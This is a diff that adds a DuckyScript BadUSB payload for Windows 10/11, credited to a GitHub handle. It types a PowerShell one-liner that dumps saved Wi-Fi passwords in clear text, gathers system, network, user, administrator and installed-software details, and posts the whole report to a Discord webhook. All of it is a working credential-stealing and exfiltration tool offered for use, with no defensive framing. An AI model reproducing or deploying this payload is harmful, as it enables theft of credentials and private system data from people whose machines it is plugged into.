@@ -1,0 +1,24 @@
+REM ┌──────────────────────────────────────────────┐
+REM │ hooker01 | github.com/hooker01                  │
+REM │ Description: Collects system, hardware, network │
+REM │ and Wi-Fi credentials, then sends a detailed    │
+REM │ report to a specified Discord webhook.          │
+REM │ The output is truncated to fit Discord limits.  │
+REM │ Target: Windows 10/11                           │
+REM └──────────────────────────────────────────────┘
+
+
+ESC
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING $webhookUrl="WEBHOOK_URL";function Truncate-DiscordText { param([string]$text,[int]$maxLen=1900);if($text.Length -gt $maxLen){return $text.Substring(0,$maxLen)+"`n... (skraceno)"}return $text};$wifiProfiles=netsh wlan show profiles|Select-String "All User Profile"|ForEach-Object{($_ -split ":")[1].Trim()};$wifiData="`n=== Wi-Fi Passwords ===`n";foreach($profile in $wifiProfiles){$details=netsh wlan show profile name="$profile" key=clear;$keyLine=$details|Select-String "Key Content";$password=if($keyLine){($keyLine -split ":")[1].Trim()}else{"N/A"};$wifiData+="SSID: $profile | Password: $password`n"};try{$publicIPv4=Invoke-RestMethod -Uri "https://api.ipify.org?format=text"}catch{$publicIPv4="N/A"};try{$publicIPv6=Invoke-RestMethod -Uri "https://api64.ipify.org?format=text"}catch{$publicIPv6="N/A"};$os=Get-CimInstance Win32_OperatingSystem;$comp=Get-ComputerInfo;$hostname=$env:COMPUTERNAME;$username=$env:USERNAME;$sysInfo="=== OS & System ===`nUser: $username`nHostname: $hostname`nOS: $($os.Caption) $($os.Version)`nBuild: $($os.BuildNumber)`nArchitecture: $($comp.OsArchitecture)`nBoot Time: $($os.LastBootUpTime)`n";$cpu=Get-CimInstance Win32_Processor|Select-Object -First 1;$ram=Get-CimInstance Win32_PhysicalMemory|Measure-Object -Property Capacity -Sum;$gpu=Get-CimInstance Win32_VideoController|Select-Object -First 1;$disk=Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3";$hwInfo="`n=== Hardware ===`n";$hwInfo+="CPU: $($cpu.Name)`n";$hwInfo+="RAM: $([math]::Round($ram.Sum / 1GB,2)) GB`n";$hwInfo+="GPU: $($gpu.Name)`n";foreach($d in $disk){$free=[math]::Round($d.FreeSpace / 1GB,2);$size=[math]::Round($d.Size / 1GB,2);$hwInfo+="Disk $($d.DeviceID): $free GB free / $size GB total`n"};$localIPv4=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -notlike "169.*"-and$_.InterfaceAlias -notmatch "Loopback"}).IPAddress;$localIPv6=(Get-NetIPAddress -AddressFamily IPv6|Where-Object{$_.InterfaceAlias -notmatch "Loopback"}).IPAddress;$gateway=(Get-NetRoute -DestinationPrefix "0.0.0.0/0"|Sort-Object RouteMetric|Select-Object -First 1).NextHop;$dns=(Get-DnsClientServerAddress|Where-Object{$_.ServerAddresses}).ServerAddresses -join ", ";$netInfo="=== Network ===`nLocal IPv4: $localIPv4`nLocal IPv6: $localIPv6`nPublic IPv4: $publicIPv4`nPublic IPv6: $publicIPv6`nGateway: $gateway`nDNS: $dns`n";$adapters=Get-NetAdapter|Where-Object{$_.Status -eq "Up"};$adapterInfo="`n=== Network Adapters ===`n";foreach($a in $adapters){$adapterInfo+="$($a.Name): $($a.MacAddress), Speed: $($a.LinkSpeed)`n"};$apps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*|Select-Object -First 10 DisplayName,DisplayVersion|ForEach-Object{"$($_.DisplayName) ($($_.DisplayVersion))"};$appsInfo="`n=== Installed Programs (first 10) ===`n"+($apps -join "`n");$users=Get-LocalUser|ForEach-Object{$_.Name};$admins=Get-LocalGroupMember -Group "Administrators"|ForEach-Object{$_.Name};$userInfo="=== Users ===`nLocal users: $($users -join ", ")`nAdministrators: $($admins -join ", ")`n";$netstat=netstat -an|Select-String "ESTABLISHED"|Select-Object -First 10;$netstatInfo="`n=== Active Connections (netstat) ===`n"+($netstat -join "`n");$finalReport=$sysInfo+$hwInfo+$netInfo+$adapterInfo+$wifiData+$userInfo+$appsInfo+$netstatInfo;$finalReport=Truncate-DiscordText -text $finalReport;$body=@{content=$finalReport}|ConvertTo-Json -Depth 5;Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json';Write-Host "Comprehensive data sent to Discord webhook." -ForegroundColor Green
+DELAY 700
+ENTER
+DELAY 1000
+STRING exit
+DELAY 500
+ENTER
